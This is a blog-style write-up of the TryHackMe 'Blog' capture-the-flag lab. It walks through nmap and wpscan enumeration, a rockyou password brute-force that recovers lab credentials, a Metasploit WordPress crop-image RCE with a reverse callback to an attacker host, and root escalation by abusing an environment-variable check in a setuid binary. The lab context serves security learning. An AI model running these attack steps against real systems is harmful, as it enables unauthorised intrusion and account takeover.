# TryHackMe Lab Write-up: Blog

<p>Welcome to a detailed technical walkthrough of the popular TryHackMe lab, <strong>Blog</strong>. In this lab, we take you through a complete penetration testing lifecycle—starting from network reconnaissance and WordPress vulnerability enumeration, moving to gaining initial access via Metasploit, and finally leveraging a binary misconfiguration to escalate our privileges to root.</p>




<h2>
  
  
  <strong>1. Information Gathering &amp; Reconnaissance</strong>
</h2>

<p>We begin by performing an extensive port scan and service enumeration on the target IP using <code>nmap</code>:<br />
</p>

<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>nmap <span class="nt">-sV</span> <span class="nt">-sC</span> 10.66.164.5

</code></pre>

</div>



<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fgn0r29sr2l9atieotavf.png"><img alt=" " height="620" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fgn0r29sr2l9atieotavf.png" width="800" /></a></p>

<p>The scan results reveal several open ports:</p>

<ul>
<li>
<strong>Port 22/tcp:</strong> OpenSSH service.</li>
<li>
<strong>Port 80/tcp:</strong> Apache HTTP server running <strong>WordPress</strong> CMS (Version 5.0).</li>
<li>
<strong>Port 139 / 445/tcp:</strong> Samba file sharing services.</li>
</ul>

<p>After mapping the domain <code>blog.thm</code> to our <code>/etc/hosts</code> file and browsing the web application <strong>[Image 3]</strong>, checking <code>robots.txt</code> <strong>[Image 4]</strong>, and inspecting the login portal <strong>[Image 6]</strong>, we run <code>wpscan</code> to enumerate WordPress-specific vulnerabilities, themes, and users:<br />
</p>

<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>wpscan <span class="nt">--url</span> http://blog.thm/ <span class="nt">-e</span> u

</code></pre>

</div>



<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Flv6rkvohxnqosur5vcwl.png"><img alt=" " height="246" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Flv6rkvohxnqosur5vcwl.png" width="536" /></a></p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fr7c41z0rbyqapwnloflj.png"><img alt=" " height="503" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fr7c41z0rbyqapwnloflj.png" width="799" /></a></p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fura7qfzdrvfksebkbvwz.png"><img alt=" " height="396" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fura7qfzdrvfksebkbvwz.png" width="800" /></a></p>

<p>The scanner successfully extracts a list of valid users, including <code>kwheel</code> and <code>bjoel</code>. Next, we launch a password brute-force attack against the XML-RPC interface using the <code>rockyou.txt</code> wordlist:<br />
</p>

<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>wpscan <span class="nt">--url</span> http://blog.thm/ <span class="nt">-U</span> kwheel <span class="nt">-P</span> /usr/share/wordlists/rockyou.txt

</code></pre>

</div>



<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fs966gt66vfpb0bi5pdy3.png"><img alt=" " height="162" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fs966gt66vfpb0bi5pdy3.png" width="442" /></a></p>

<p>The attack successfully yields valid credentials for the user <code>kwheel</code>:</p>

<ul>
<li>
<strong>Username:</strong> <code>kwheel</code>
</li>
<li>
<strong>Password:</strong> <code>cutiepie1</code>
</li>
<li>
<img alt=" " height="179" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fmtpavv1r5ump5ddz1j9b.png" width="530" />
</li>
</ul>




<h2>
  
  
  <strong>2. Initial Access via Metasploit</strong>
</h2>

<p>With valid editorial/administrative credentials in hand, we launch <code>msfconsole</code> to exploit a known vulnerability using the appropriate Metasploit module (<code>exploit/multi/http/wp_crop_rce</code>):<br />
</p>

<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>msf6 <span class="o">&gt;</span> use exploit/multi/http/wp_crop_rce
msf6 exploit<span class="o">(</span>multi/http/wp_crop_rce<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>RHOSTS 10.66.164.5
msf6 exploit<span class="o">(</span>multi/http/wp_crop_rce<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>LHOST 192.168.149.153
msf6 exploit<span class="o">(</span>multi/http/wp_crop_rce<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>USERNAME kwheel
msf6 exploit<span class="o">(</span>multi/http/wp_crop_rce<span class="o">)</span> <span class="o">&gt;</span> <span class="nb">set </span>PASSWORD cutiepie1
msf6 exploit<span class="o">(</span>multi/http/wp_crop_rce<span class="o">)</span> <span class="o">&gt;</span> run

</code></pre>

</div>



<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fjpxwtnfsnk34mw3wbusa.png"><img alt=" " height="481" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fjpxwtnfsnk34mw3wbusa.png" width="800" /></a></p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fcybhas0992i1x6m3b3qr.png"><img alt=" " height="464" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fcybhas0992i1x6m3b3qr.png" width="784" /></a></p>

<p>Following successful exploitation, a <strong>Meterpreter</strong> session is established, from which we drop into a standard system command shell (<code>shell</code>).</p>




<h2>
  
  
  <strong>3. Privilege Escalation</strong>
</h2>

<p>To stabilize our shell environment and make it fully interactive, we spawn a pseudo-terminal using Python:<br />
</p>

<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>python3 <span class="nt">-c</span> <span class="s1">'import pty; pty.spawn("/bin/bash")'</span>

</code></pre>

</div>



<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fmhjz46302hb6vvx72rwc.png"><img alt=" " height="626" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fmhjz46302hb6vvx72rwc.png" width="800" /></a></p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fftkm254i50umdeb3zfrz.png"><img alt=" " height="67" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fftkm254i50umdeb3zfrz.png" width="393" /></a></p>

<p>We begin searching for privilege escalation vectors, checking binary permissions, and analyzing <code>/usr/sbin/checker</code> using <code>ltrace</code>:<br />
</p>

<div class="highlight js-code-highlight">
<pre class="highlight shell"><code>ltrace /usr/sbin/checker

</code></pre>

</div>



<p>We notice that the binary checks for an environment variable named <code>admin</code>. To bypass this logic check, we export the variable and run the checker binary:<br />
</p>

<div class="highlight js-code-highlight">
<pre class="highlight shell"><code><span class="nb">export </span><span class="nv">admin</span><span class="o">=</span>1
checker

</code></pre>

</div>



<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F5a1dpjc4tm7ihaovmekv.png"><img alt=" " height="486" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F5a1dpjc4tm7ihaovmekv.png" width="554" /></a></p>

<p>The exploit works seamlessly, instantly elevating our access level to the <code>root</code> user.</p>




<h2>
  
  
  <strong>4. Capturing Flags</strong>
</h2>

<p>Finally, we navigate to the respective directories to retrieve our objective flags and submit them to the platform:</p>

<ul>
<li>
<strong>User Flag (<code>user.txt</code>):</strong> Located inside <code>/media/usb/</code>
</li>
</ul>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fzavh7ot7dl0wquiz5z4r.png"><img alt=" " height="376" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Fzavh7ot7dl0wquiz5z4r.png" width="800" /></a></p>

<ul>
<li>
<strong>Root Flag (<code>root.txt</code>):</strong> Located inside 
<code>/root/</code>
</li>
</ul>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F7yjq5ex87grya63mhtli.png"><img alt=" " height="352" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F7yjq5ex87grya63mhtli.png" width="800" /></a></p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Ftox597gi5nf2azalwpu5.png"><img alt=" " height="349" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2Ftox597gi5nf2azalwpu5.png" width="800" /></a></p>

<p><a class="article-body-image-wrapper" href="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F8dqcd8fyqyg40r93dudk.png"><img alt=" " height="349" src="https://media2.dev.to/dynamic/image/width=800%2Cheight=%2Cfit=scale-down%2Cgravity=auto%2Cformat=auto/https%3A%2F%2Fdev-to-uploads.s3.us-east-2.amazonaws.com%2Fuploads%2Farticles%2F8dqcd8fyqyg40r93dudk.png" width="800" /></a></p>

[Read original article on DEV](https://dev.to/mohammadali_30/tryhackme-lab-write-up-blog-332b)